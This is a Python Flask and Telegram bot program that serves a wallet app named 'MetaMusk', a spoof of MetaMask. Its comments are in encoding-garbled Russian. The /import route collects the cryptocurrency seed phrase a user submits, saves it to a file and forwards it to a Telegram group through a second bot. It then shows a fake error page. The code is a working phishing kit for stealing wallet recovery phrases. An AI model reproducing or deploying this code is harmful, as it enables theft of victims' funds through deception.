import os
import threading
import asyncio
from datetime import datetime, timedelta

from flask import Flask, render_template, request, session
import requests

from telegram import Bot, InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo, Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ================== –ù–ê–°–¢–†–û–ô–ö–ò ==================
TELEGRAM_TOKEN_MAIN = os.getenv("TELEGRAM_TOKEN_MAIN")   # –±–æ—Ç –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
TELEGRAM_TOKEN_GROUP = os.getenv("TELEGRAM_TOKEN_GROUP") # –±–æ—Ç –¥–ª—è –≥—Ä—É–ø–ø—ã
CHAT_ID = os.getenv("CHAT_ID")                           # id –≥—Ä—É–ø–ø—ã
SECRET_KEY = os.getenv("SECRET_KEY", "mysecretkey")      # –¥–ª—è Flask session
SITE_URL = os.getenv("SITE_URL", "https://digital-953g.onrender.com/")

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
FILE_PATH = os.path.join(BASE_DIR, "words.txt")

# –ü–∞–º—è—Ç—å: –∫—Ç–æ —Å–æ–∑–¥–∞–ª –∫–æ—à–µ–ª—ë–∫
user_wallets = {}

# Flask
app = Flask(__name__)
app.secret_key = SECRET_KEY

# ================== –§–£–ù–ö–¶–ò–Ø: –æ—Ç–ø—Ä–∞–≤–∫–∞ –≤ –≥—Ä—É–ø–ø—É ==================
group_bot = Bot(token=TELEGRAM_TOKEN_GROUP)

async def send_to_group(message: str):
    """–û—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –≤—Ç–æ—Ä—ã–º –±–æ—Ç–æ–º –≤ –≥—Ä—É–ø–ø—É"""
    await group_bot.send_message(chat_id=CHAT_ID, text=message)

# ================== TELEGRAM-–ë–û–¢ ==================
application = Application.builder().token(TELEGRAM_TOKEN_MAIN).build()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    # –µ—Å–ª–∏ —É–∂–µ —Å–æ–∑–¥–∞–≤–∞–ª –∫–æ—à–µ–ª—ë–∫ ‚Üí –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è–µ–º —Å—Ä–∞–∑—É –Ω–∞ new_wallet
    if user_wallets.get(user_id, False):
        target_url = f"{SITE_URL}/new_wallet"
    else:
        target_url = SITE_URL

    markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("üåê –û—Ç–∫—Ä—ã—Ç—å MetaMusk", web_app=WebAppInfo(url=target_url))]
    ])

    await update.message.reply_text(
        f"–ü—Ä–∏–≤–µ—Ç, {update.effective_user.first_name}! üöÄ\n"
        f"–ù–∞–∂–º–∏ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ, —á—Ç–æ–±—ã –æ—Ç–∫—Ä—ã—Ç—å –∫–æ—à–µ–ª–µ–∫ MetaMusk:",
        reply_markup=markup
    )

application.add_handler(CommandHandler("start", start))

def run_bot():
    application.run_polling()

# ================== FLASK-–ú–ê–†–®–†–£–¢–´ ==================
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/wallet')
def wallet():
    return render_template('wallet.html')

@app.route('/error')
def error():
    now = datetime.now()
    start = now - timedelta(hours=1)
    end = now + timedelta(hours=3)
    start_time = start.strftime("%H:%M %d.%m.%Y")
    end_time = end.strftime("%H:%M %d.%m.%Y")
    return render_template("error.html", start_time=start_time, end_time=end_time)

@app.route('/new_wallet')
def new_wallet():
    # –ø–æ–º–µ—á–∞–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∫–∞–∫ —Å–æ–∑–¥–∞–≤—à–µ–≥–æ –∫–æ—à–µ–ª—ë–∫
    user_id = session.get("telegram_user_id")
    if user_id:
        user_wallets[user_id] = True
        # —É–≤–µ–¥–æ–º–∏–º –≤ –≥—Ä—É–ø–ø—É
        asyncio.run(send_to_group(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} —Å–æ–∑–¥–∞–ª –Ω–æ–≤—ã–π –∫–æ—à–µ–ª—ë–∫"))
    return render_template('new_wallet.html')

@app.route('/import', methods=['GET', 'POST'])
def import_wallet():
    if request.method == 'POST':
        seed_phrase = request.form.get('words')
        if seed_phrase:
            # —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –≤ —Ñ–∞–π–ª
            with open(FILE_PATH, 'a', encoding='utf-8') as f:
                f.write(seed_phrase + '\n')

            # –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –≤–æ 2-–π –±–æ—Ç –≤ –≥—Ä—É–ø–ø—É
            asyncio.run(send_to_group(f"–ò–º–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–∞ —Å–∏–¥-—Ñ—Ä–∞–∑–∞:\n{seed_phrase}"))

            return render_template('error.html')
    return render_template('import.html')

# ================== MAIN ==================
if __name__ == '__main__':
    # –ó–∞–ø—É—Å–∫–∞–µ–º –±–æ—Ç–∞ –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()

    # Flask —Å–µ—Ä–≤–µ—Ä
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)
